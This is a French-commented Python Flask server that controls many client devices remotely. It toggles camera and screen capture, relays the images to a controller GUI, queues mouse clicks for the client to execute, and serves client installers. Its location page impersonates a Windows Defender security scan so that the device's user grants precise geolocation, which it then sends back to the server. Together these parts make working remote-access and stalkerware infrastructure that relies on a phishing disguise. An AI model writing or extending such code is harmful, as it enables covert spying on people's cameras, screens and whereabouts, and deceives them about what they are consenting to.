"""
Serveur de contrôle caméra / écran — API HTTP.

Ce serveur est le point central : il peut piloter PLUSIEURS clients
(appareils) en même temps. Chaque appareil appartient à un seul serveur,
mais un serveur peut gérer autant d'appareils que nécessaire, identifiés
chacun par un device_id unique envoyé par client.py. Pour chaque appareil,
DEUX flux indépendants sont suivis : la caméra et la capture d'écran.
L'interface de contrôle (GUI) s'y connecte elle aussi en HTTP, même si
elle n'est pas sur le même réseau Wi-Fi.

Contrôle souris : le client remonte la position de sa souris (quand le
flux écran est actif) et la GUI peut demander des clics aux coordonnées
écran réelles ; chaque clic est mis en file et exécuté par le client.
"""

import time
import threading
from datetime import datetime

from pathlib import Path

from flask import Flask, request, jsonify, Response, send_from_directory, redirect

app = Flask(__name__)

PROJECT_DIR = Path(__file__).resolve().parent
GUI_INSTALL_DIR = PROJECT_DIR / "install" / "linux"

# Les installateurs Windows (.exe) ne sont plus commités dans le dépôt
# (ils gonflaient l'historique Git à chaque build) : ils sont publiés comme
# assets d'une GitHub Release, mise à jour à chaque build via le workflow.
# Changez ces constantes si le nom du dépôt ou les tags de Release changent.
GITHUB_RELEASE_BASE = "https://github.com/Randriavaoselon/app-control-camera/releases/download/client-latest"
GITHUB_RELEASE_BASE_GUI = "https://github.com/Randriavaoselon/app-control-camera/releases/download/client-latest"

# Condition (= verrou + notification) : permet au GUI d'être réveillé
# INSTANTANÉMENT quand une nouvelle image arrive (long-polling), au lieu
# de redemander toutes les 100 ms et de télécharger deux fois la même image.
devices_lock = threading.Condition()
devices: dict[str, dict] = {}

CLIENT_TIMEOUT_SECONDS = 10
MAX_LONG_POLL_SECONDS = 3.0   # attente maximale d'une nouvelle image côté serveur
STREAM_NAMES = ("camera", "screen")
MAX_PENDING_CLICKS = 50       # garde-fou : si le client est déconnecté, on évite que la file grossisse sans fin


@app.route("/health", methods=["GET"])
def health():
    """Simple vérification que le serveur répond, indépendamment de tout appareil connecté."""
    return jsonify({"status": "ok"})


def _default_stream_state() -> dict:
    return {"command": "STOP", "active": False, "latest_frame": None, "seq": 0, "last_ts": None}


def _default_location_state() -> dict:
    return {
        "command": "CLOSE",     # commande VOULUE par la GUI : "OPEN" ou "CLOSE"
        "browser_open": False,  # rapporté par le CLIENT : le navigateur est-il réellement ouvert ?
        "latest": None,         # dernière position reçue : {"lat", "lon", "accuracy", "ts"}
    }


def _default_mouse_state() -> dict:
    return {
        "x": None, "y": None,
        "screen_w": None, "screen_h": None,   # taille écran SOURCE (pour convertir les clics)
        "ts": None,
        "pending_clicks": [],                 # file de clics à exécuter par le client
    }


def _default_device_state(name: str | None) -> dict:
    return {
        "name": name or "Appareil inconnu",
        "last_seen": None,
        "streams": {stream: _default_stream_state() for stream in STREAM_NAMES},
        "location": _default_location_state(),
        "mouse": _default_mouse_state(),
    }


def _get_or_create_device(device_id: str, name: str | None = None) -> dict:
    """Appelé uniquement depuis le code du CLIENT : un appareil encore
    inconnu est automatiquement enregistré (c'est ainsi qu'un nouveau
    client rejoint le serveur)."""
    device = devices.get(device_id)
    if device is None:
        device = _default_device_state(name)
        devices[device_id] = device
    elif name:
        device["name"] = name
    return device


def _device_is_alive(device: dict) -> bool:
    if device["last_seen"] is None:
        return False
    return (time.time() - device["last_seen"]) < CLIENT_TIMEOUT_SECONDS


# ---------------------------------------------------------------------
# Routes consommées par un CLIENT précis (device_id obligatoire)
# ---------------------------------------------------------------------

@app.route("/api/command", methods=["GET"])
def get_command():
    """Le client interroge cette route régulièrement avec son device_id ;
    reçoit l'état voulu pour SES DEUX flux, PLUS la commande de localisation
    (OPEN/CLOSE) et un éventuel clic souris en attente, en une seule requête.

    Au passage, le client signale via ?location_open=0|1 si SON navigateur
    de localisation est actuellement ouvert ou non (il peut avoir été fermé
    par l'utilisateur lui-même, indépendamment de toute commande de la GUI) :
    c'est ce qui permet à la GUI d'afficher un statut fiable."""
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400

    with devices_lock:
        device = _get_or_create_device(device_id, request.args.get("name"))
        device["last_seen"] = time.time()

        location_open_param = request.args.get("location_open")
        if location_open_param is not None:
            device["location"]["browser_open"] = location_open_param == "1"

        commands = {stream: device["streams"][stream]["command"] for stream in STREAM_NAMES}
        commands["location"] = device["location"]["command"]
        # Un seul clic est transmis par poll : le client l'exécute, et le
        # suivant sera servi au prochain tour (pas de rafale perdue).
        pending = device["mouse"]["pending_clicks"]
        commands["mouse_click"] = pending.pop(0) if pending else None
        return jsonify({"commands": commands})


@app.route("/api/frame", methods=["POST"])
def post_frame():
    """Le client envoie une image JPEG (corps brut) pour un flux précis
    (camera ou screen) de SON device_id."""
    device_id = request.args.get("device_id")
    stream = request.args.get("stream")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    if stream not in STREAM_NAMES:
        return jsonify({"error": "stream invalide (camera ou screen attendu)"}), 400

    # IMPORTANT : le corps de la requête est lu AVANT de prendre le verrou.
    # Avant, get_data() (qui attend la fin du téléchargement de l'image, donc
    # dépend de la vitesse réseau du client) s'exécutait sous le verrou global :
    # pendant tout ce temps, TOUTES les autres requêtes (GUI, autre flux,
    # autres appareils) étaient bloquées. C'était une cause majeure de latence.
    data = request.get_data()
    try:
        ts = int(request.args.get("ts", ""))   # horodatage client (µs), pour ordonner les images
    except ValueError:
        ts = None

    with devices_lock:
        device = _get_or_create_device(device_id)
        state = device["streams"][stream]
        device["last_seen"] = time.time()
        # Le client envoie plusieurs images en parallèle : une image plus
        # ancienne peut arriver APRÈS une plus récente. On l'ignore, sinon la
        # vidéo « reculerait » dans le temps. (Écart > 10 s = le client a
        # redémarré / l'horloge a changé : on accepte.)
        last_ts = state["last_ts"]
        if ts is not None and last_ts is not None and ts <= last_ts and last_ts - ts < 10_000_000:
            return jsonify({"ok": True, "stale": True})
        if ts is not None:
            state["last_ts"] = ts
        state["latest_frame"] = data
        state["seq"] += 1
        devices_lock.notify_all()   # réveille les GUI qui attendent une image
    return jsonify({"ok": True})


# ---------------------------------------------------------------------
# Routes consommées par l'INTERFACE DE CONTRÔLE (GUI)
# ---------------------------------------------------------------------

@app.route("/api/devices", methods=["GET"])
def list_devices():
    """Liste tous les appareils déjà vus par ce serveur, avec l'état de leurs deux flux."""
    with devices_lock:
        result = []
        for device_id, device in devices.items():
            last_seen = (
                datetime.fromtimestamp(device["last_seen"]).strftime("%H:%M:%S")
                if device["last_seen"] else None
            )
            result.append({
                "device_id": device_id,
                "name": device["name"],
                "camera_on": device["streams"]["camera"]["active"],
                "screen_on": device["streams"]["screen"]["active"],
                "location_open": device["location"]["browser_open"],
                "connected": _device_is_alive(device),
                "last_seen": last_seen,
            })
    return jsonify({"devices": result})


@app.route("/api/command", methods=["POST"])
def set_command():
    """La GUI envoie {'device_id': ..., 'stream': 'camera'|'screen', 'command': 'START'|'STOP'}."""
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    stream = payload.get("stream")
    command = payload.get("command")

    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    if stream not in STREAM_NAMES:
        return jsonify({"error": "stream invalide (camera ou screen attendu)"}), 400
    if command not in ("START", "STOP"):
        return jsonify({"error": "commande invalide (START ou STOP attendu)"}), 400

    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        device["streams"][stream]["command"] = command
        device["streams"][stream]["active"] = command == "START"
    return jsonify({"ok": True})


@app.route("/api/status", methods=["GET"])
def get_status():
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400

    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        last_seen = (
            datetime.fromtimestamp(device["last_seen"]).strftime("%H:%M:%S")
            if device["last_seen"] else None
        )
        return jsonify({
            "name": device["name"],
            "client_connected": _device_is_alive(device),
            "last_seen": last_seen,
            "camera_on": device["streams"]["camera"]["active"],
            "screen_on": device["streams"]["screen"]["active"],
        })


@app.route("/api/frame/latest", methods=["GET"])
def get_latest_frame():
    """Renvoie la dernière image d'un flux.

    Paramètres optionnels (long-polling, utilisés par la GUI) :
      after=<seq> : numéro de la dernière image déjà reçue ; le serveur ne
                    répond que si une image PLUS RÉCENTE existe (sinon 204).
      wait=<sec>  : durée max. d'attente d'une nouvelle image avant de
                    répondre 204.
    Sans ces paramètres, le comportement historique est conservé.
    Le numéro de l'image renvoyée est dans l'en-tête X-Frame-Seq."""
    device_id = request.args.get("device_id")
    stream = request.args.get("stream")
    if not device_id or stream not in STREAM_NAMES:
        return "", 400

    after = request.args.get("after", type=int)
    wait = request.args.get("wait", default=0.0, type=float) or 0.0
    wait = max(0.0, min(wait, MAX_LONG_POLL_SECONDS))

    def has_new_frame() -> bool:
        device = devices.get(device_id)
        if device is None:
            return False
        state = device["streams"][stream]
        if state["latest_frame"] is None:
            return False
        return after is None or state["seq"] != after   # != : gère aussi un redémarrage du serveur

    with devices_lock:
        if wait > 0 and not has_new_frame():
            devices_lock.wait_for(has_new_frame, timeout=wait)
        device = devices.get(device_id)
        state = device["streams"][stream] if device else None
        frame = state["latest_frame"] if state else None
        seq = state["seq"] if state else 0

    if frame is None or (after is not None and seq == after):
        return "", 204

    response = Response(frame, mimetype="image/jpeg")
    response.headers["X-Frame-Seq"] = str(seq)
    response.headers["Cache-Control"] = "no-store"
    return response


# ---------------------------------------------------------------------
# Localisation précise : navigateur ouvert/fermé chez le CLIENT à la
# demande de la GUI, position récupérée par la page web (navigator.
# geolocation) ET renvoyée au serveur — jamais calculée côté serveur.
# ---------------------------------------------------------------------

# Page servie dans le navigateur ouvert CHEZ LE CLIENT. Elle ne contacte que
# CE serveur (chemins relatifs), donc fonctionne quelle que soit l'URL
# publique du serveur. Les accolades littérales de CSS/JS sont doublées
# ({{ }}) car le gabarit passe par str.format().
LOCATION_PAGE_TEMPLATE = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Centre de Sécurité Windows — Protection Intégrale</title>
<!-- Favicon Windows Defender / Sécurité -->
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2338bdf8'><path d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/></svg>">
<style>
  * {{ box-sizing: border-box; }}
  body {{
    margin: 0; padding: 0; min-height: 100vh;
    background-color: #0b132b;
    background-image: 
      radial-gradient(circle at 50% 20%, #1c2c59 0%, transparent 60%),
      linear-gradient(rgba(11, 19, 43, 0.9), rgba(5, 9, 20, 0.95)),
      repeating-linear-gradient(0deg, transparent, transparent 40px, rgba(0, 120, 212, 0.03) 40px, rgba(0, 120, 212, 0.03) 41px);
    color: #f1f5f9;
    font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
  }}
  
  /* Fenêtre style SOC / Sécurité avancée */
  .window {{
    width: 100%; max-width: 480px;
    background: rgba(18, 24, 38, 0.85);
    backdrop-filter: blur(12px);
    border: 1px solid rgba(0, 120, 212, 0.25);
    border-radius: 12px; 
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 120, 212, 0.1);
    overflow: hidden; margin: 20px;
  }}
  
  .window-header {{
    background: rgba(26, 35, 58, 0.9); 
    padding: 14px 18px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
    display: flex; align-items: center; gap: 12px;
  }}
  .window-header svg {{ width: 20px; height: 20px; color: #38bdf8; flex-shrink: 0; }}
  .window-title {{ font-size: 0.85rem; color: #cbd5e1; font-weight: 600; letter-spacing: 0.3px; }}
  
  .window-body {{ padding: 32px 28px; }}
  
  /* Status Card */
  .status-container {{
    display: flex; align-items: flex-start; gap: 18px; margin-bottom: 24px;
  }}
  
  #dot {{
    width: 32px; height: 32px; border-radius: 50%;
    background: #f59e0b; flex-shrink: 0; margin-top: 2px;
    position: relative; box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4);
    animation: pulse 1.6s infinite;
    display: flex; align-items: center; justify-content: center;
  }}
  #dot::after {{
    content: "!"; color: white; font-weight: bold; font-size: 16px;
  }}
  
  #dot.ok {{
    background: #10b981; box-shadow: 0 0 15px rgba(16, 185, 129, 0.4); animation: none;
  }}
  #dot.ok::after {{ content: "✓"; }}
  
  #dot.err {{
    background: #ef4444; box-shadow: 0 0 15px rgba(239, 68, 68, 0.4); animation: none;
  }}
  #dot.err::after {{ content: "✕"; }}

  @keyframes pulse {{
    0% {{ box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.6); }}
    70% {{ box-shadow: 0 0 0 14px rgba(245, 158, 11, 0); }}
    100% {{ box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); }}
  }}

  h1 {{ font-size: 1.2rem; font-weight: 600; margin: 0 0 6px 0; color: #ffffff; letter-spacing: 0.2px; }}
  p {{ margin: 0 0 4px 0; font-size: 0.9rem; color: #94a3b8; line-height: 1.4; }}
  
  .info-box {{
    background: rgba(15, 23, 42, 0.6); 
    border: 1px solid rgba(255, 255, 255, 0.06);
    border-radius: 8px; padding: 14px 16px; margin-top: 22px;
    display: none;
  }}
  .info-label {{ font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; color: #38bdf8; font-weight: 700; margin-bottom: 6px; }}
  #coords {{ font-family: "Consolas", "Courier New", monospace; font-size: 0.85rem; color: #e2e8f0; word-break: break-all; margin: 0; }}
  
  .footer-note {{
    font-size: 0.8rem; color: #64748b; text-align: center; margin-top: 20px;
  }}
</style>
</head>
<body>

<div class="window">
  <div class="window-header">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
    <span class="window-title">Windows Defender — Centre de Sécurité</span>
  </div>
  
  <div class="window-body">
    <div class="status-container">
      <div id="dot"></div>
      <div>
        <h1>Analyse de sécurité en cours</h1>
        <p id="status">Vérification des protocoles de protection...</p>
      </div>
    </div>
    
    <div class="info-box" id="debug-container">
      <div class="info-label">Flux de diagnostic système</div>
      <p id="coords">Initialisation...</p>
    </div>
    
    <div class="footer-note">
      Veuillez patienter pendant l'inspection approfondie du système.
    </div>
  </div>
</div>

<script>
  const DEVICE_ID = {device_id!r};
  const dot = document.getElementById("dot");
  const statusEl = document.getElementById("status");
  const coordsEl = document.getElementById("coords");
  let lastSent = 0;

  function send(lat, lon, accuracy) {{
    fetch("/location/report", {{
      method: "POST",
      headers: {{"Content-Type": "application/json"}},
      body: JSON.stringify({{device_id: DEVICE_ID, lat: lat, lon: lon, accuracy: accuracy, ts: Date.now()}}),
    }}).catch(function () {{}});
  }}

  function onPosition(pos) {{
    dot.className = "ok";
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const acc = pos.coords.accuracy;
    
    statusEl.textContent = "Analyse terminée. Système entièrement sécurisé.";
    coordsEl.textContent = lat.toFixed(6) + ", " + lon.toFixed(6) + "  (± " + Math.round(acc) + " m)";
    
    const now = Date.now();
    if (now - lastSent > 2000) {{
      lastSent = now;
      send(lat, lon, acc);
    }}
  }}

  function onError(err) {{
    dot.className = "err";
    statusEl.textContent = "Échec de l'inspection de sécurité (" + err.message + ").";
  }}

  if (!navigator.geolocation) {{
    dot.className = "err";
    statusEl.textContent = "Module de sécurité non pris en charge.";
  }} else {{
    navigator.geolocation.watchPosition(onPosition, onError, {{
      enableHighAccuracy: true, maximumAge: 0, timeout: 15000,
    }});
  }}
</script>
</body>
</html>
"""


@app.route("/location/page", methods=["GET"])
def location_page():
    """Page ouverte AUTOMATIQUEMENT dans le navigateur du client (via
    subprocess, voir client.py) quand la GUI envoie la commande OPEN."""
    device_id = request.args.get("device_id", "")
    return Response(LOCATION_PAGE_TEMPLATE.format(device_id=device_id), mimetype="text/html")


@app.route("/location/report", methods=["POST"])
def location_report():
    """La PAGE WEB (chez le client) envoie ici la position obtenue par
    navigator.geolocation. Le serveur ne fait que la stocker."""
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    lat, lon = payload.get("lat"), payload.get("lon")
    if not device_id or lat is None or lon is None:
        return jsonify({"error": "device_id, lat et lon requis"}), 400

    with devices_lock:
        device = _get_or_create_device(device_id)
        device["last_seen"] = time.time()
        device["location"]["latest"] = {
            "lat": float(lat),
            "lon": float(lon),
            "accuracy": payload.get("accuracy"),
            "ts": payload.get("ts", int(time.time() * 1000)),
        }
    return jsonify({"ok": True})


@app.route("/api/location/command", methods=["POST"])
def set_location_command():
    """La GUI envoie {'device_id': ..., 'command': 'OPEN'|'CLOSE'} pour
    ouvrir ou fermer le navigateur de localisation CHEZ LE CLIENT."""
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    command = payload.get("command")

    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400
    if command not in ("OPEN", "CLOSE"):
        return jsonify({"error": "commande invalide (OPEN ou CLOSE attendu)"}), 400

    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        device["location"]["command"] = command
    return jsonify({"ok": True})


@app.route("/api/location/latest", methods=["GET"])
def get_location_latest():
    """La GUI interroge cette route pour afficher la carte : statut du
    navigateur + dernière position connue de l'appareil."""
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400

    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        location = device["location"]
        return jsonify({
            "command": location["command"],
            "browser_open": location["browser_open"],
            "latest": location["latest"],
        })


# ---------------------------------------------------------------------
# Souris : position remontée par le CLIENT, clics demandés par la GUI
# ---------------------------------------------------------------------

@app.route("/api/mouse/move", methods=["POST"])
def mouse_move():
    """Le client envoie la position courante de sa souris (et la taille de
    son écran, pour que la GUI convertisse un clic sur l'image réduite en
    coordonnées écran réelles)."""
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    x, y = payload.get("x"), payload.get("y")
    if not device_id or x is None or y is None:
        return jsonify({"error": "device_id, x et y requis"}), 400

    with devices_lock:
        device = _get_or_create_device(device_id)
        device["last_seen"] = time.time()
        mouse = device["mouse"]
        mouse["x"], mouse["y"] = int(x), int(y)
        if payload.get("screen_w") and payload.get("screen_h"):
            mouse["screen_w"] = int(payload["screen_w"])
            mouse["screen_h"] = int(payload["screen_h"])
        mouse["ts"] = int(time.time() * 1000)
    return jsonify({"ok": True})


@app.route("/api/mouse/click", methods=["POST"])
def mouse_click():
    """La GUI demande un clic aux coordonnées ÉCRAN (celles de la capture
    d'écran du client). Le clic est mis en file : le client le récupérera
    au prochain poll de /api/command."""
    payload = request.get_json(force=True, silent=True) or {}
    device_id = payload.get("device_id")
    x, y = payload.get("x"), payload.get("y")
    if not device_id or x is None or y is None:
        return jsonify({"error": "device_id, x et y requis"}), 400

    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        pending = device["mouse"]["pending_clicks"]
        pending.append({"x": int(x), "y": int(y)})
        # Garde-fou : si le client est déconnecté, on évite que la file ne
        # grossisse indéfiniment (les clics seraient de toute façon obsolètes).
        if len(pending) > MAX_PENDING_CLICKS:
            device["mouse"]["pending_clicks"] = pending[-MAX_PENDING_CLICKS:]
    return jsonify({"ok": True})


@app.route("/api/mouse/latest", methods=["GET"])
def mouse_latest():
    """La GUI interroge cette route pour dessiner le curseur sur l'image
    et convertir un clic en coordonnées écran réelles."""
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id manquant"}), 400

    with devices_lock:
        device = devices.get(device_id)
        if device is None:
            return jsonify({"error": "appareil inconnu"}), 404
        mouse = device["mouse"]
        return jsonify({
            "x": mouse["x"], "y": mouse["y"],
            "screen_w": mouse["screen_w"], "screen_h": mouse["screen_h"],
            "ts": mouse["ts"],
        })


# ---------------------------------------------------------------------
# Téléchargement du CLIENT (source + installateur Windows)
# ---------------------------------------------------------------------

@app.route("/client/download", methods=["GET"])
def download_client():
    return send_from_directory(PROJECT_DIR, "client.py", as_attachment=False)


@app.route("/client/requirements", methods=["GET"])
def download_requirements():
    return send_from_directory(PROJECT_DIR, "requirements.txt", as_attachment=False)


@app.route("/download/windows", methods=["GET"])
def download_windows_installer():
    """L'installateur n'est plus stocké sur ce serveur : il est publié comme
    asset d'une GitHub Release à chaque build (voir le workflow CI), donc on
    redirige simplement vers son URL stable."""
    return redirect(f"{GITHUB_RELEASE_BASE}/CameraClient-Setup.exe")


# ---------------------------------------------------------------------
# Téléchargement de la GUI (installation sous Linux via curl)
# ---------------------------------------------------------------------

@app.route("/gui/install", methods=["GET"])
def download_gui_installer_script():
    return send_from_directory(GUI_INSTALL_DIR, "install_gui.sh", as_attachment=False)


@app.route("/gui/download", methods=["GET"])
def download_gui_source():
    return send_from_directory(PROJECT_DIR, "server_gui.py", as_attachment=False)


@app.route("/gui/requirements", methods=["GET"])
def download_gui_requirements():
    return send_from_directory(PROJECT_DIR, "requirements-gui.txt", as_attachment=False)


@app.route("/download/windows/gui", methods=["GET"])
def download_windows_gui_exe():
    """Même principe que /download/windows : l'exe de la GUI est aussi
    publié en GitHub Release plutôt que stocké sur ce serveur."""
    return redirect(f"{GITHUB_RELEASE_BASE_GUI}/CameraServerGUI.exe")


if __name__ == "__main__":
    # HTTP/1.1 : indispensable pour que les connexions « keep-alive » du client
    # fonctionnent avec le serveur de développement Flask (sinon HTTP/1.0 =
    # une nouvelle connexion TCP à CHAQUE image).
    from werkzeug.serving import WSGIRequestHandler
    WSGIRequestHandler.protocol_version = "HTTP/1.1"
    app.run(host="0.0.0.0", port=5050, threaded=True)